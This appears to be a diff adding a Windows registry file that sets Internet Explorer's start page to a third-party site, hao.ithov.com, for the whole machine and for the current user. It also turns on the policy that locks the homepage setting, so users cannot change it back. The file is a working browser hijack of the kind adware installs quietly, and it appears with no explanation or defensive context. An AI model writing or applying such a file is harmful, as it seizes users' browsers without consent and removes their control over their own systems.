@@ -1,0 +1,10 @@
+REGEDIT4
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main]
+"Start Page"="http://hao.ithov.com"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
+ "Start Page"="http://hao.ithov.com"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Control Panel]
+"HomePage"=dword:00000001
